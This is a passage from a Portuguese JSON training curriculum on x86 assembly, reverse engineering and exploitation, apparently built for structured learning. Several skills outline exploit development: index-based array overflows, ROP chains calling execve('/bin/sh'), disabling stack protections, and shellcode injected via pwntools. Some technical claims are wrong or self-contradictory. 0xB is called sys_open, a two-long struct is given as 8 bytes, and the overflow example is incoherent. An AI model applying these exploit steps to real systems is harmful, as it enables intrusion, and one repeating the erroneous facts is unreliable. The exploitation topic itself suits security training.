                                    "Procure instruções como LEA, MOV ou ADD com operandos [reg * scale].",
                                    "Registre todas as escalas observadas em acessos a memória dentro de loops.",
                                    "Compare com o código fonte original para validar padrões.",
                                    "Classifique acessos por tipo de registrador (RAX, RDI, etc.) e contexto (argumentos, locais)."
                                  ],
                                  "verification": "Liste 5 instruções com escalas de um binário e anote o contexto de cada uma.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Binário de teste compilado de struct array em C",
                                    "Ghidra",
                                    "Notepad++ para anotações"
                                  ],
                                  "tips": "Use busca por strings ou cross-references para encontrar acessos relevantes.",
                                  "learningObjective": "Detectar e catalogar escalas em código desmontado de forma sistemática.",
                                  "commonMistakes": [
                                    "Overlook instruções LEA usadas para cálculos de endereço.",
                                    "Confundir escalas em acessos não-array.",
                                    "Não considerar otimizações do compilador."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Escalas para Tamanhos de Elementos e Estruturas",
                                  "subSteps": [
                                    "Mapeie escalas para tamanhos: 1=byte/char, 2=short/word, 4=int/float, 8=long/double/pointer.",
                                    "Inferir tamanho de structs somando offsets baseados em múltiplas escalas ou displacements.",
                                    "Valide com alinhamento típico (ex: structs padded para 8 bytes).",
                                    "Reconstrua pseudocódigo ou diagrama da estrutura de dados.",
                                    "Teste hipóteses alterando o binário ou usando debuggers estáticos."
                                  ],
                                  "verification": "Desenhe um diagrama de memória mostrando a estrutura inferida com tamanhos corretos.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Exemplos de binários com arrays de structs",
                                    "Ghidra Structure Editor",
                                    "Papel e caneta para diagramas"
                                  ],
                                  "tips": "Procure padrões recorrentes como incrementos de índice por 1 com escala fixa.",
                                  "learningObjective": "Traduzir observações de escalas em definições precisas de estruturas de dados.",
                                  "commonMistakes": [
                                    "Ignorar padding ou alinhamento.",
                                    "Assumir escala máxima sem evidência.",
                                    "Confundir array de pointers com array de structs."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise em Reversão Estática Completa",
                                  "subSteps": [
                                    "Analise uma função inteira que manipula arrays, rastreando fluxos de dados.",
                                    "Combine análise de escalas com chamadas de sistema para inferir parâmetros.",
                                    "Documente a estrutura completa, incluindo tamanhos e offsets.",
                                    "Simule acessos em um script Python para validar.",
                                    "Compare com ferramentas automatizadas como FLIRT signatures."
                                  ],
                                  "verification": "Produza um relatório resumindo a estrutura de dados revelada e justifique com instruções citadas.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Binário complexo de malware ou CTF",
                                    "Ghidra",
                                    "Python com Capstone para simulação"
                                  ],
                                  "tips": "Use graph view no Ghidra para visualizar loops e acessos.",
                                  "learningObjective": "Integrar análise de escalas em uma reversão estática holística.",
                                  "commonMistakes": [
                                    "Focar apenas em um loop, ignorando variações.",
                                    "Não validar com múltiplas evidências.",
                                    "Subestimar impacto de otimizações como vectorization."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário, observe instruções como 'mov rax, [rdi + rcx*8 + 16]' em um loop onde rcx é o índice. Isso indica um array de structs de 8 bytes (ex: {long field1; long field2;}) com offset 16 para o array após header. Inferir: struct size=8, acessando campo em offset 0.",
                              "finalVerifications": [
                                "Identificou corretamente todas as escalas em pelo menos 10 instruções de um binário.",
                                "Mapeou escalas para tamanhos de dados sem erros em exemplos conhecidos.",
                                "Reconstruiu uma estrutura de dados válida que explica todos os acessos observados.",
                                "Validou inferências com simulação ou diagrama de memória.",
                                "Documentou padrões em relatório claro e conciso.",
                                "Explicou exceções ou casos ambíguos adequadamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de escalas (100% em exemplos padrão).",
                                "Profundidade da análise de estruturas (offsets e paddings corretos).",
                                "Qualidade da documentação e diagramas.",
                                "Capacidade de lidar com ambiguidades e justificar suposições.",
                                "Eficiência temporal (conclusão dentro de estimados).",
                                "Integração com contexto mais amplo de reversão."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Endereçamento de memória e registradores.",
                                "Programação em C: Definição de structs e arrays multidimensionais.",
                                "Matemática: Potências de 2 e alinhamento binário.",
                                "Análise de Malware: Inferência de C2 structures em binários maliciosos."
                              ],
                              "realWorldApplication": "Durante análise estática de malware, identificar escalas em acessos a buffers de rede revela formatos de protocolos C2, permitindo decodificação de comandos sem execução dinâmica; essencial em relatórios de threat intelligence ou patches de vulnerabilidades zero-day."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.4.3",
                            "name": "Explorar indexados em injeções de código",
                            "description": "Usar modos indexados para overflows em arrays, calculando ROP chains que manipulem índices para controle de execução em chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Modos de Endereçamento Indexado em Assembly",
                                  "subSteps": [
                                    "Estude a documentação oficial de modos de endereçamento x86/x64, focando em [base + index * scale + displacement].",
                                    "Analise exemplos simples de código assembly usando GDB para observar como índices afetam acessos a memória.",
                                    "Implemente um programa C simples com array acessado via ponteiro indexado e disasseemble com objdump.",
                                    "Identifique diferenças entre modos indexados e diretos em termos de vulnerabilidades.",
                                    "Pratique modificando índices dinamicamente em runtime com pwndbg."
                                  ],
                                  "verification": "Explique em um relatório curto como um índice manipulado pode levar a um OOB read/write.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 2)",
                                    "GDB/Pwndbg",
                                    "Objdump",
                                    "Compilador GCC",
                                    "Editor de texto/VSCode"
                                  ],
                                  "tips": "Use 'info registers' no GDB para rastrear base e index registers.",
                                  "learningObjective": "Dominar o funcionamento de modos indexados e seu papel em acessos a arrays.",
                                  "commonMistakes": [
                                    "Confundir scale factors (1,2,4,8)",
                                    "Ignorar alinhamento de memória",
                                    "Não considerar ASLR em testes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Vulnerabilidades de Overflow em Arrays com Indexação",
                                  "subSteps": [
                                    "Revise código-fonte C vulnerável com arrays indexados por input do usuário.",
                                    "Use fuzzing básico (e.g., AFL ou manual) para detectar overflows via índices inválidos.",
                                    "Disasseemble o binário com Ghidra/IDA para mapear acessos indexados em funções.",
                                    "Simule overflows em um debugger, alterando o índice para acessar memória fora dos bounds.",
                                    "Documente o offset exato do overflow e impactos potenciais."
                                  ],
                                  "verification": "Forneça um PoC script Python que triggera o overflow e dumps memória adjacente.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Pwntools para scripting",
                                    "Binário vulnerável de labs como ROP Emporium",
                                    "Python 3"
                                  ],
                                  "tips": "Compile com -fno-stack-protector -z execstack para simplicidade inicial.",
                                  "learningObjective": "Detectar e validar overflows específicos de indexação em binários.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar proteções como Canary/PIE",
                                    "Testar apenas em input pequeno",
                                    "Não mapear a stack heap layout"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Craftar Injeções de Código Usando Modos Indexados para Overflow",
                                  "subSteps": [
                                    "Calcule o payload necessário para overflow do índice, visando reescrever return address ou variáveis.",
                                    "Incorpore gadgets assembly que usem registradores indexados para propagar o controle.",
                                    "Teste o payload em GDB, ajustando para bypass ASLR parcial.",
                                    "Integre com ROPgadget para encontrar chains iniciais baseadas em índices.",
                                    "Itere com cyclic patterns (pattern_create.py) para precisão de offsets."
                                  ],
                                  "verification": "Execute o exploit localmente e demonstre controle de RIP/EIP via índice manipulado.",
                                  "estimatedTime": "4 hours",
                                  "materials": [
                                    "ROPgadget tool",
                                    "GDB com gef/pyew",
                                    "Pattern offset tools (cyclic)",
                                    "Binário target do step 2"
                                  ],
                                  "tips": "Priorize gadgets com lea [reg + index] para manipulação fina.",
                                  "learningObjective": "Construir payloads de injeção que explorem indexados para controle inicial.",
                                  "commonMistakes": [
                                    "Overflow incorreto de tamanho (little vs big endian)",
                                    "Gadgets incompatíveis com arquitetura",
                                    "Ignorar null bytes em strings"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular ROP Chains e Controlar Execução em Chamadas de Sistema",
                                  "subSteps": [
                                    "Mapeie syscalls relevantes (e.g., execve) e seus argumentos via man pages.",
                                    "Construa ROP chain usando índices para carregar strings/args em registradores.",
                                    "Manipule índice para pivotar stack ou ajustar ponteiros em chamadas indexadas.",
                                    "Teste chain completo para spawn shell ou read/write arbitrary.",
                                    "Otimize para bypass NX/DEP via mprotect em ROP se necessário."
                                  ],
                                  "verification": "Desenvolva exploit que chama system('/bin/sh') via ROP indexado e capture output.",
                                  "estimatedTime": "5 hours",
                                  "materials": [
                                    "ROPER/ROPgadget",
                                    "Syscall tables (x86_64)",
                                    "Netcat para remote test",
                                    "Docker para isolamento"
                                  ],
                                  "tips": "Use 'checksec' para avaliar mitigações e planejar.",
                                  "learningObjective": "Integrar ROP com indexados para hijack completo de syscalls.",
                                  "commonMistakes": [
                                    "Args errados em syscalls (alinhamento rdi,rsi,rdx)",
                                    "Leaks insuficientes para ASLR full",
                                    "Chain muito longa causando segfault"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Refinar o Exploit Completo",
                                  "subSteps": [
                                    "Teste em ambiente remote simulado (Docker/EC2).",
                                    "Analise crashes com core dumps e refine offsets.",
                                    "Adicione leak de endereço base via formato string + indexado.",
                                    "Documente chain ROP com diagramas de memória.",
                                    "Compartilhe writeup com repro steps."
                                  ],
                                  "verification": "Exploit roda consistentemente em 10/10 trials sem crash.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Docker-compose para lab",
                                    "Core dump analyzer (gdb)",
                                    "Exploit-DB exemplos semelhantes"
                                  ],
                                  "tips": "Automatize com one_gadget para chains mais curtas.",
                                  "learningObjective": "Garantir robustez do exploit em cenários reais.",
                                  "commonMistakes": [
                                    "Dependência de luck em ASLR",
                                    "Não testar multi-threaded",
                                    "Falta de cleanup em PoC"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário CTF com 'int arr[10]; read(0, arr[idx], 100);' onde idx=user_input, injete idx=0x41414141 para overflow arr[0], usando ROP para set idx a gadget address, chain para execve('/bin/sh').",
                              "finalVerifications": [
                                "Exploit triggera overflow via índice manipulado.",
                                "ROP chain controla RIP para syscall.",
                                "Shell spawna sem crashes repetidos.",
                                "Offsets calculados manualmente corretos.",
                                "Bypass de ASLR parcial demonstrado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets indexados (90% match).",
                                "Eficiência da chain ROP (menos de 20 gadgets).",
                                "Robustez em ambientes variados (3+ testes).",
                                "Documentação clara de cálculos de índice.",
                                "Criatividade em manipulação de memória."
                              ],
                              "crossCurricularConnections": [
                                "Análise Reversing (disassembly com Ghidra).",
                                "Programação Assembly (crafting gadgets).",
                                "Sistemas Operacionais (syscalls internals).",
                                "Criptografia (leaks via format strings).",
                                "Redes (remote exploitation)."
                              ],
                              "realWorldApplication": "Desenvolvimento de exploits para CVEs como buffer overflows em software legado (e.g., routers IoT), pentesting em binários proprietários, ou pesquisa em bypass de mitigações em ataques APT."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.4",
                    "name": "Instruções Básicas de Manipulação de Memória",
                    "description": "Comandos MOV, LEA, PUSH e POP para leitura, escrita e alocação em memória.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.4.1",
                        "name": "Instrução MOV",
                        "description": "A instrução MOV realiza a cópia de dados entre registradores, imediatos e memória, sendo fundamental para leitura e escrita direta em memória em assembly x86 (32 e 64 bits), sem alterar flags.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.1.1",
                            "name": "MOV entre registradores",
                            "description": "Copiar o conteúdo de um registrador para outro, como MOV EAX, EBX em 32 bits ou MOV RAX, RBX em 64 bits, demonstrando transferência rápida sem acesso à memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Registradores e Transferência de Dados",
                                  "subSteps": [
                                    "Estude os registradores de propósito geral em x86 (32 bits: EAX, EBX, etc.) e x86-64 (RAX, RBX, etc.).",
                                    "Identifique tamanhos: 32 bits (E*) vs 64 bits (R*).",
                                    "Explique por que MOV entre registradores é mais rápido que via memória (sem latência de cache).",
                                    "Liste registradores fonte e destino permitidos (qualquer GPR para GPR).",
                                    "Revise flags afetadas: nenhuma (MOV não altera flags)."
                                  ],
                                  "verification": "Resuma em uma tabela os registradores principais e confirme que MOV reg->reg não acessa memória.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 2)",
                                    "Diagrama de registradores x86"
                                  ],
                                  "tips": "Use diagramas visuais para memorizar nomes e tamanhos de registradores.",
                                  "learningObjective": "Entender o papel dos registradores e vantagens da transferência direta.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32b com 64b (ex: EAX vs RAX)",
                                    "Achar que MOV altera flags"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender Sintaxe e Codificação da Instrução MOV",
                                  "subSteps": [
                                    "Memorize sintaxe: MOV destino, fonte (ex: MOV EAX, EBX ou MOV RAX, RBX).",
                                    "Pratique notação em assembly Intel vs AT&T.",
                                    "Codifique exemplos simples: MOV EAX, 0x1234 (imediato para reg, mas foque reg->reg).",
                                    "Gere opcode manualmente: 89 /r para MOV r32, r/m32.",
                                    "Teste em simulador online para validar sintaxe."
                                  ],
                                  "verification": "Escreva 5 variações corretas de MOV reg->reg e valide em um assembler online.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "NASM ou GAS assembler",
                                    "Simulador como Godbolt.org ou emu8086"
                                  ],
                                  "tips": "Sempre especifique tamanho correto para evitar truncamento.",
                                  "learningObjective": "Dominar a sintaxe exata para MOV entre registradores em 32/64 bits.",
                                  "commonMistakes": [
                                    "Inverter fonte e destino",
                                    "Usar sintaxe errada (ex: MOV EBX, EAX ao invés de MOV EAX, EBX)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Executar Código com MOV reg->reg",
                                  "subSteps": [
                                    "Escreva um programa NASM simples: mov ebx, 42; mov eax, ebx; sys_exit.",
                                    "Compile e linke: nasm -f elf64 file.asm; ld file.o -o file.",
                                    "Execute com GDB: gdb ./file; break *main; run; stepi até MOV.",
                                    "Inspecione registradores: info registers eax ebx.",
                                    "Modifique valores e reexecute para observar transferência."
                                  ],
                                  "verification": "Confirme via GDB que o valor copiado aparece no registrador destino.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM, ld, GDB (Linux)",
                                    "Editor de texto como VSCode com extensão assembly"
                                  ],
                                  "tips": "Use 'x/i $pc' no GDB para ver instrução disassemblada.",
                                  "learningObjective": "Executar e depurar MOV reg->reg em ambiente real.",
                                  "commonMistakes": [
                                    "Erros de linking (falta de _start)",
                                    "Não alinhar seções no assembly"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e Depurar em Contexto de Binários",
                                  "subSteps": [
                                    "Gere binário com MOV reg->reg e abra em objdump ou Ghidra.",
                                    "Identifique instrução em disassembly: 89 c3 para MOV EBX,EAX.",
                                    "Simule execução passo a passo em debugger.",
                                    "Teste cenários de exploit: copiar ponteiro para reg e usar em call.",
                                    "Compare 32b vs 64b em binários diferentes."
                                  ],
                                  "verification": "Disassemble um binário e anote o endereço/opcode do MOV reg->reg.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "objdump, Ghidra ou IDA Free",
                                    "Binário de teste compilado"
                                  ],
                                  "tips": "Procure padrões de opcode 0x89/0x8B em hex dumps.",
                                  "learningObjective": "Aplicar em análise de binários para segurança.",
                                  "commonMistakes": [
                                    "Confundir MOV reg-reg com MOV reg-mem",
                                    "Ignorar extensões de registrador em 64b"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Otimizar Uso de MOV",
                                  "subSteps": [
                                    "Otimize código: prefira MOV reg-reg sobre push/pop.",
                                    "Teste performance com loops copiando regs.",
                                    "Analise impacto em análise estática (ROP chains).",
                                    "Crie teste unitário: assert(eax == ebx após MOV).",
                                    "Documente em relatório de aprendizado."
                                  ],
                                  "verification": "Execute teste e confirme performance > via memória.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GDB com perf",
                                    "Script Python para automação"
                                  ],
                                  "tips": "Em segurança, MOV reg-reg é comum em shells e payloads.",
                                  "learningObjective": "Avaliar eficiência e uso avançado em contextos reais.",
                                  "commonMistakes": [
                                    "Usar MOV desnecessário quando PUSH/POP basta",
                                    "Sobrecarregar regs desnecessariamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um shellcode para exploit: mov ebx, 0xdeadbeef; mov eax, ebx; int 0x80; copia valor para syscall sem memória, evitando detecção por acessos RWX.",
                              "finalVerifications": [
                                "Codifica e executa MOV EAX, EBX sem erros.",
                                "Inspeciona GDB e confirma transferência de valor.",
                                "Disassembla binário e identifica opcode corretamente.",
                                "Diferencia MOV reg-reg de reg-mem/reg-imm.",
                                "Aplica em exemplo de 64 bits com RAX/RBX.",
                                "Explica vantagens de performance em 1 frase."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe (100% correto).",
                                "Execução bem-sucedida em debugger.",
                                "Identificação correta em disassembly.",
                                "Explicação clara de não-alteração de flags.",
                                "Uso contextual em segurança (ex: bypass).",
                                "Tempo de conclusão dentro do estimado."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e pipeline.",
                                "Programação em C: Inline assembly com __asm__ mov.",
                                "Análise de Malware: Identificar MOV em RE.",
                                "Algoritmos: Otimização de cópias em low-level.",
                                "Redes/Segurança: Shellcodes em exploits."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, identifica MOV reg-reg em payloads para reconstruir lógica sem memória (evasão de ASLR); em otimização de software, reduz latência em hot paths de jogos ou crypto."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.2",
                            "name": "MOV de imediato para registrador",
                            "description": "Carregar um valor imediato em um registrador, ex: MOV EAX, 0x12345678, útil para inicialização de variáveis e setup de chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a sintaxe e o propósito da instrução MOV imediato para registrador",
                                  "subSteps": [
                                    "Estude a sintaxe básica: MOV registrador_destino, valor_imediato (ex: MOV EAX, 0x12345678)",
                                    "Identifique registradores suportados: EAX, EBX, ECX, EDX, ESP, EBP, ESI, EDI em x86 32-bit",
                                    "Aprenda o tamanho do imediato: até 32 bits para registradores 32-bit, representado em hex ou decimal",
                                    "Entenda o propósito: inicializar registradores com constantes para setup de variáveis ou parâmetros de funções",
                                    "Revise exemplos de uso em chamadas de sistema, como preparar argumentos para int 0x80 em Linux"
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a sintaxe e dê 3 exemplos corretos de MOV imediato",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Documentação Intel x86 manuals (PDF ou online), referência de registradores x86",
                                  "tips": "Use notação hexadecimal para valores grandes para evitar erros de digitação em decimal",
                                  "learningObjective": "Dominar a sintaxe e aplicações iniciais da instrução MOV imediato",
                                  "commonMistakes": "Confundir registradores de 16-bit (AX) com 32-bit (EAX); usar valores maiores que 32 bits sem extensão"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente de desenvolvimento e assemble para x86",
                                  "subSteps": [
                                    "Instale NASM (Netwide Assembler) e um linker como ld para Linux ou MASM para Windows",
                                    "Configure um editor como VS Code com extensão Assembly ou use online como Godbolt.org",
                                    "Crie um arquivo .asm básico com seções [bits 32], section .text, global _start",
                                    "Teste assemble e link: nasm -f elf32 file.asm; ld -m elf_i386 file.o -o file",
                                    "Integre um debugger como GDB ou x64dbg para inspeção de registradores"
                                  ],
                                  "verification": "Assemble e execute um programa vazio sem erros, confirmando ambiente funcional",
                                  "estimatedTime": "20 minutos",
                                  "materials": "NASM baixado de nasm.us, GDB ou OllyDbg/x64dbg, terminal ou IDE",
                                  "tips": "Use Docker com imagem Ubuntu para ambiente limpo se em Windows",
                                  "learningObjective": "Preparar ferramentas para codificação e depuração de Assembly x86",
                                  "commonMistakes": "Esquecer flags de 32-bit (-f elf32 ou -m elf_i386); não declarar seções corretamente"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escrever e testar código com MOV imediato para registrador",
                                  "subSteps": [
                                    "Escreva código: section .text; global _start; _start: MOV EAX, 0x12345678; int 0x80 (exit)",
                                    "Adicione sys_exit: MOV EAX, 1; MOV EBX, 0; int 0x80 para saída limpa",
                                    "Assemble, link e execute o binário resultante",
                                    "Use GDB: gdb ./file; break _start; run; info registers para ver EAX",
                                    "Modifique o valor imediato e reteste para múltiplos registradores (EBX, ECX)"
                                  ],
                                  "verification": "Em debugger, confirme que EAX contém exatamente 0x12345678 após MOV",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Arquivo .asm criado, NASM, ld, GDB",
                                  "tips": "Sempre use 'info registers' no GDB após breakpoint para checar múltiplos registradores",
                                  "learningObjective": "Implementar e validar MOV imediato em código real",
                                  "commonMistakes": "Omitir ponto e vírgula em comentários; usar sintaxe AT&T em vez de Intel (NASM usa Intel)"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar variações e depuração avançada",
                                  "subSteps": [
                                    "Teste MOV com valores negativos: MOV EAX, -1 (equivalente a 0xFFFFFFFF)",
                                    "Carregue em stack pointer: MOV ESP, 0x12345678 (cuidado, pode crashar)",
                                    "Combine com outras instruções: MOV EAX, 0x12345678; ADD EAX, 1; verifique mudança",
                                    "Debug cenários de erro: tente MOV EAX, 0x123456789 (64-bit inválido) e veja assemble falhar",
                                    "Analise dump de memória ou use strace para ver comportamento em runtime"
                                  ],
                                  "verification": "Crie e debugue 3 variações diferentes, documentando valores de registradores pré/pós",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Mesmo ambiente do step 3, mais hexdump ou objdump para análise binária",
                                  "tips": "Use objdump -d file para disassemble e confirmar instrução gerada (B8 78 56 34 12 para MOV EAX,imm32)",
                                  "learningObjective": "Manejar edge cases e integrar MOV em sequências de instruções",
                                  "commonMistakes": "Ignorar endianness em dumps (little-endian em x86); mover para registradores protegidos sem handler"
                                }
                              ],
                              "practicalExample": "Em um shellcode para exploit: MOV EAX, 0xB (sys_open); MOV EBX, filename_ptr; MOV ECX, 0 (O_RDONLY); INT 0x80. Isso inicializa registradores para chamar open() sem bibliotecas.",
                              "finalVerifications": [
                                "Registrador destino contém exatamente o valor imediato especificado (ex: EAX == 0x12345678)",
                                "Programa assenta e linka sem warnings de overflow ou sintaxe inválida",
                                "Execução não crasha e debugger mostra MOV efetivo antes de próximas instruções",
                                "Disassemble confirma opcode correto (B8 para MOV EAX,imm32 seguido dos bytes little-endian)",
                                "Teste com 3 registradores diferentes (EAX, EBX, ECX) funciona consistentemente",
                                "Integração em syscall simples (ex: sys_exit) executa sem erros"
                              ],
                              "assessmentCriteria": [
                                "Correção da sintaxe Intel e valores imediatos válidos (32-bit max)",
                                "Configuração correta de ambiente 32-bit e uso de debugger para verificação",
                                "Precisão na inspeção de registradores via GDB ou similar",
                                "Capacidade de identificar e corrigir erros comuns como overflow",
                                "Demonstração de pelo menos 3 exemplos variados com documentação",
                                "Explicação clara do propósito em contextos de segurança computacional"
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Inicialização de registradores em kernels/bootloaders",
                                "Engenharia Reversa: Identificar MOVs em binários para análise de malware",
                                "Segurança da Informação: Crafting shellcodes para exploits ROP",
                                "Arquitetura de Computadores: Entender fluxo de dados em pipeline x86"
                              ],
                              "realWorldApplication": "Em análise forense digital, reverse engineers usam MOV imediato para setup de syscalls em emuladores como QEMU para testar binários maliciosos sem risco; em desenvolvimento de firmware embarcado, inicializa registradores para configurações de hardware como portas serial."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.3",
                            "name": "MOV de memória para registrador",
                            "description": "Ler dados de um endereço de memória para um registrador, como MOV EAX, [EBX], essencial para acessar estruturas de dados em buffer overflows ou shellcodes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Sintaxe e Semântica da Instrução MOV de Memória para Registrador",
                                  "subSteps": [
                                    "Estude a documentação oficial da Intel para instruções x86-64, focando em MOV.",
                                    "Identifique os operandos: destino (registrador como EAX) e origem ([EBX] para endereço de memória).",
                                    "Diferencie MOV reg, [mem] de MOV [mem], reg e de MOV reg, mem.",
                                    "Analise o ciclo de execução: fetch endereço, load valor da memória, store no registrador.",
                                    "Memorize tamanhos: byte (MOV AL, [EBX]), word, dword (EAX), qword (RAX)."
                                  ],
                                  "verification": "Escreva uma explicação em suas próprias palavras da instrução MOV EAX, [EBX] e desenhe um diagrama de fluxo de dados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manual de Desenvolvedor Intel x86 (PDF)",
                                    "Documentação NASM ou MASM",
                                    "Editor de texto"
                                  ],
                                  "tips": "Sempre use colchetes [] para dereferenciar memória; sem colchetes é valor imediato ou registrador direto.",
                                  "learningObjective": "Dominar a sintaxe exata e o comportamento de carga indireta de memória para registrador.",
                                  "commonMistakes": [
                                    "Omitir colchetes, confundindo com MOV imediato",
                                    "Ignorar alinhamento de memória causando faults",
                                    "Confundir direção: mem->reg vs reg->mem"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Desenvolvimento e Depuração",
                                  "subSteps": [
                                    "Instale um assembler (NASM) e linker (ld) no Linux ou use Visual Studio no Windows.",
                                    "Configure um debugger: GDB para Linux ou x64dbg/WinDbg para Windows.",
                                    "Escreva um programa assembly minimalista que defina uma variável na memória e um registrador base.",
                                    "Compile e carregue no debugger: nasm -f elf64 programa.asm; ld programa.o -o programa.",
                                    "Defina breakpoints iniciais e examine registradores/memória vazia."
                                  ],
                                  "verification": "Execute o ambiente e confirme que pode ver registradores e memória em tempo real no debugger.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "NASM (instalador)",
                                    "GDB ou x64dbg",
                                    "Sistema Linux/Windows com permissões",
                                    "Exemplo de código assembly básico"
                                  ],
                                  "tips": "Use 'info registers' no GDB para visualizar todos; 'x/10x $rsp' para examinar memória.",
                                  "learningObjective": "Preparar um ambiente funcional para testar instruções de memória isoladamente.",
                                  "commonMistakes": [
                                    "Falhar na instalação de dependências 64-bit vs 32-bit",
                                    "Não alinhar dados na seção .data",
                                    "Esquecer de definir EBX antes de dereferenciar"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Testar a Instrução MOV em Código Assembly",
                                  "subSteps": [
                                    "Defina uma variável na seção .data: minha_var: dd 0x12345678.",
                                    "Carregue endereço base em EBX: mov ebx, minha_var.",
                                    "Execute MOV EAX, [EBX] e verifique EAX == 0x12345678 no debugger.",
                                    "Teste variações: byte (AL, [EBX]), com offset (EAX, [EBX+4]).",
                                    "Adicione loop para múltiplas cargas e observe flags (nenhuma alterada por MOV)."
                                  ],
                                  "verification": "No debugger, pause após MOV, confirme valor em EAX e ausência de segment faults.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Código assembly template",
                                    "Debugger configurado",
                                    "Calculadora hexadecimal"
                                  ],
                                  "tips": "Use 'stepi' no GDB para avançar instrução por instrução; compare antes/depois em registradores.",
                                  "learningObjective": "Executar com sucesso MOV mem->reg e depurar seu comportamento.",
                                  "commonMistakes": [
                                    "Endereço inválido causando SIGSEGV",
                                    "Misturar tamanhos (dword em byte reg)",
                                    "Não zerar registradores antes para isolamento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Contexto de Shellcode e Buffer Overflow",
                                  "subSteps": [
                                    "Crie um shellcode simples que use MOV para carregar endereço de '/bin/sh' de buffer.",
                                    "Simule buffer overflow: stack com endereço em EBX apontando para string.",
                                    "Integre em exploit PoC com Python (pwntools) para injetar shellcode.",
                                    "Teste em ambiente vulnerável (ex: vulnerable C program com gets()).",
                                    "Debugue falhas comuns como bad chars ou ASLR."
                                  ],
                                  "verification": "Execute o exploit e obtenha shell interativa confirmando carga correta via MOV.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Pwntools Python library",
                                    "Programa C vulnerável",
                                    "GDB com gef/peda plugin"
                                  ],
                                  "tips": "Encode shellcode para evitar null bytes; use 'ROPgadget' para chains se necessário.",
                                  "learningObjective": "Integrar MOV mem->reg em cenários reais de exploração de vulnerabilidades.",
                                  "commonMistakes": [
                                    "ASLR não desabilitado no teste",
                                    "Endereço relativo incorreto em shellcode",
                                    "Overflow não alinhado para EBX"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um shellcode para buffer overflow, após controlar EBX com endereço de uma string '/bin/sh' no buffer: MOV EAX, [EBX] carrega o primeiro dword da string em EAX para uso em syscall execve.",
                              "finalVerifications": [
                                "Explicar verbalmente o ciclo de CPU para MOV EAX, [EBX].",
                                "Escrever e executar assembly standalone sem erros.",
                                "Criar shellcode funcional com MOV em exploit PoC.",
                                "Identificar e corrigir bug em código com MOV falho.",
                                "Disassemblar binário e destacar todas as instâncias de MOV mem->reg.",
                                "Comparar performance com LEA vs MOV em benchmarks simples."
